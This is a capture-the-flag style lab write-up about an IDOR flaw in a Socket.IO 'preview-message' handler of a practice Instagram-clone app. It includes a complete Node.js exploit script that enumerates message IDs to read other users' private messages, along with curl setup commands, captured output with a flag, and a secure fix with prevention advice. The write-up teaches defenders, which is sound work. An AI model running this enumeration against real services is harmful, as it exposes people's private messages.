---
title: Ottergram - WebSocket IDOR
tags:
  - bugforge
  - IDOR
  - websocket
  - socket.io
  - broken-access-control
aliases:
  - "/BugForge/Ottergram---WebSocket-IDOR"
---
- Same Ottergram social app as the other writeups - React SPA frontend, Express backend, Instagram-clone with posts, comments, likes, and direct messages.
- The interesting attack surface this time is **not** the REST API - it is the Socket.IO real-time layer sitting right next to it.
- Classic pattern: the REST endpoints are locked down, but a parallel WebSocket code path re-implements a data lookup and *forgets the ownership check*.

## Background - Socket.IO in 30 seconds

- Socket.IO is a library that wraps WebSockets with an event system. Think of it as "HTTP routes but over a persistent socket."
- `socket.emit("event-name", data)` = send an event to the other side (like sending a POST request).
- `socket.on("event-name", callback)` = listen for an event from the other side (like defining a GET handler).
- Authentication happens once, at **connection time**, via the `auth` option in the handshake - not on every message. A valid login token = a valid socket connection.
- The key insight for this bug: Socket.IO authenticates the *connection* but says nothing about *authorization per event*. Each event handler has to do its own ownership checks - and one of them didn't.

## Enumeration

### Step 1 - Extract the source map

- Ottergram is a React SPA. The browser loads a minified bundle (`main.*.js`), and in these labs that bundle ships a **source map** - a file that maps minified code back to the original readable source.
- To find it: open the browser DevTools -> Sources tab, or fetch the JS bundle and look at the last line for `//# sourceMappingURL=main.*.js.map`. Append `.map` to the bundle URL to download it.
- Chrome DevTools auto-extracts source maps (Sources tab -> shows the `src/` tree). Alternatively, download the `.map` file and use any source-map unpacker. Either way you get the original, readable client source code.

### Step 2 - Read the client source

Two files told the whole story.

**`App.js`** - how the socket authenticates:

```js
// App.js:49
const socket = io(window.location.origin, { auth: { token } });
window.socket = socket;
```

- The JWT is passed in the Socket.IO **handshake** (`auth.token`), not per-message. A valid login equals a valid socket - authentication is at the connection level.

**`ToastNotification.js`** - the finding. The client emits a `preview-message` event with a raw message id, and the server answers with the message body:

```js
// ToastNotification.js:21
socket.emit("preview-message", messageId);
socket.on("message-preview", ({ messageId, preview }) => { ... });
```

### Step 3 - Spot the gap

- Compare the WebSocket side to the REST side. `GET /api/messages/inbox` is properly user-scoped - it only ever returns *your* conversations.
- But the `preview-message` handler takes a **client-supplied `messageId`** and looks it up directly. If the server does not verify that the requesting socket's user is a participant in that message, that is a textbook IDOR - just over WebSockets instead of HTTP.

Hypothesis: **any authenticated user can enumerate `messageId` and read every private DM on the platform.**

## The Vulnerability

- The server authenticates the *socket* (JWT in the handshake) but never authorizes the *object*.
- The `preview-message` handler does a raw `messageId` lookup with no check that the connected user is the sender or recipient of that specific message.
- The REST equivalent (`/api/messages/inbox`) was written correctly and scopes to the caller. The bug is the second, parallel code path that re-implemented the lookup and dropped the check.

Vulnerable server-side pattern:

```js
// VULNERABLE - authenticates the socket, never authorizes the object
socket.on("preview-message", async (messageId) => {
  const msg = await db.getMessageById(messageId);   // no ownership check
  socket.emit("message-preview", { messageId, preview: msg.content });
});
```

## Proof of Concept

### Prerequisites

- Your BugForge lab URL (we'll call it `BASE` below) - something like `https://lab-XXXX.labs-app.bugforge.io`
- Node.js installed (v16+)
- Install the Socket.IO client library:

```bash
npm install socket.io-client
```

### Step 1 - Register a user and get a JWT

- Register an attacker account via the REST API:

```bash
curl -s -X POST "$BASE/api/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"attacker123","email":"attacker@test.com"}'
```

- Log in to get a JWT (this is the `token` the Socket.IO handshake needs):

```bash
curl -s -X POST "$BASE/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"attacker123"}'
# -> {"token":"eyJhbGciOi...","user":{"id":9,...}}
```

- Save that `token` value - you'll paste it into the exploit script below.

### Step 2 - Connect and enumerate message IDs

- This is the full exploit. It connects to the Socket.IO server with the attacker's JWT, then fires `preview-message` for message IDs `1..20` and prints whatever the server returns:

```js
// exploit.js
const { io } = require("socket.io-client");

const BASE = "https://lab-XXXX.labs-app.bugforge.io";  // <-- your lab URL
const TOKEN = "eyJhbGciOi...";                          // <-- JWT from Step 1

const socket = io(BASE, {
  transports: ["websocket"],
  auth: { token: TOKEN },
});

socket.on("connect", () => {
  console.log("connected, id=", socket.id);
  for (let mid = 1; mid <= 20; mid++) {
    socket.emit("preview-message", mid);
  }
});

socket.on("message-preview", (data) => {
  console.log("message-preview <-", JSON.stringify(data));
});

socket.on("connect_error", (err) => {
  console.error("connect error:", err.message);
});
```

- Run it:

```bash
node exploit.js
```

### Step 3 - Read the output

```
connected, id= w6sF6HX7gGZwcw5mAAAB
message-preview <- {"messageId":1,"preview":"bug{DBs3V6x9icI7T8e43UMUAKVLBZHIukcX} Hey! I loved your recent otter post! Where did you take that photo?"}
message-preview <- {"messageId":2,"preview":"bug{...} Thanks! It was at the local aquarium. They have the cutest otters!"}
message-preview <- {"messageId":3,"preview":"bug{...} Did you see the sea otter documentary on Netflix?"}
message-preview <- {"messageId":4,"preview":"bug{...} Yes! I watched it twice already."}
message-preview <- {"error":"Message not found"}   // ids with no message
```

- The **flag** is right there in message id 1 - a conversation between other users that the attacker has nothing to do with. That's the whole bug.
- Non-existent IDs come back `{"error":"Message not found"}`, which confirms the handler is doing a raw id lookup with no ownership filter - just an existence check. Enumerate `1..N` and you drain every DM in the database.

### Flag

```
bug{DBs3V6x9icI7T8e43UMUAKVLBZHIukcX}
```

## Proving It's a Real IDOR (Optional)

- The flag in message 1 proves the bug, but a skeptic might ask: "maybe the attacker is a participant in that conversation?" To remove all doubt, plant a fresh private message between two *other* users and confirm the attacker reads it too.

- Register a second user (`carol`), log in, and send a DM to a third user (`alice`, uid 4) via REST:

```bash
curl -s -X POST "$BASE/api/messages" \
  -H "Authorization: Bearer <carol_jwt>" \
  -H "Content-Type: application/json" \
  -d '{"recipient_id":4,"content":"SECRET-DM-carol-to-alice: my private note do not leak"}'
# -> 200 {"id":7,"message":"Message sent successfully"}
```

- The attacker (`mal_v2`, uid 9) is neither sender (carol, uid 8) nor recipient (alice, uid 4). Re-run `exploit.js` and messages 7 and 8 come back too:

```
message-preview <- {"messageId":7,"preview":"bug{...} SECRET-DM-carol-to-alice: my private note do not leak"}
message-preview <- {"messageId":8,"preview":"bug{...} FLAGHUNT-SECRET-...-carol-private-to-alice"}
```

- The attacker read private DMs from a conversation she is not part of. Zero ambiguity.

## The Fix

- The handler needs to authorize the **object**, not just the connection. A valid handshake is authentication, not authorization.
- Derive the user identity from the verified handshake JWT (`socket.data.userId`) and check that the user is a participant in the requested message before returning its content.

```js
// SECURE - authorize the object, not just the connection
socket.on("preview-message", async (messageId) => {
  const userId = socket.data.userId;                // from verified handshake JWT
  const msg = await db.getMessageById(messageId);
  if (!msg || (msg.sender_id !== userId && msg.recipient_id !== userId)) {
    return socket.emit("message-preview", { error: "Message not found" });
  }
  socket.emit("message-preview", { messageId, preview: msg.content });
});
```

Additional hardening:

- Share one authorization function between the REST and WebSocket paths that touch the same data, so a second code path can never silently drop the check again.
- Return an indistinguishable `not found` for both "does not exist" and "not yours" so attackers cannot even enumerate message existence.

## Security Takeaways

### Vulnerability
- IDOR on a Socket.IO event handler (`preview-message`)
- OWASP Top 10: A01:2021 - Broken Access Control
- CWE: CWE-639 - Authorization Bypass Through User-Controlled Key

### Impact
- Any authenticated user reads ANY user's private DM by enumerating sequential message IDs.
- Full cross-account DM breach - every private conversation on the platform is readable.

### Root Cause
- The WebSocket handler authenticates the socket (JWT in the handshake) but never authorizes the object - it does not check that the connected user is the sender or recipient of that specific message.
- The REST equivalent (`/api/messages/inbox`) was written correctly and scopes to the caller. The bug is the second, parallel code path that re-implemented the lookup and dropped the check.

### Testing Methodology
1. Read the client source (source maps!) - list every `socket.emit(...)` / `socket.on(...)` pair, not just REST routes.
2. For each client->server event that takes an id, ask: does the server authorize the object, or just the connection?
3. Diff the WebSocket behaviour against the REST equivalent - if REST is scoped and WS is not, that gap is the bug.
4. Prove it with a *non-participant* account reading a *freshly planted* private message, so there is zero ambiguity about ownership.

### Prevention
- Authorize the **object**, not just the connection - a valid handshake is authentication, not authorization.
- Enforce the same access-control checks on WebSocket handlers as on the REST endpoints that touch the same data. Share one authorization function between both paths.
- Never trust client-supplied resource IDs for ownership - derive identity from the verified handshake JWT (`socket.data.userId`).
- Return an indistinguishable `not found` for both "does not exist" and "not yours" so attackers cannot even enumerate existence.
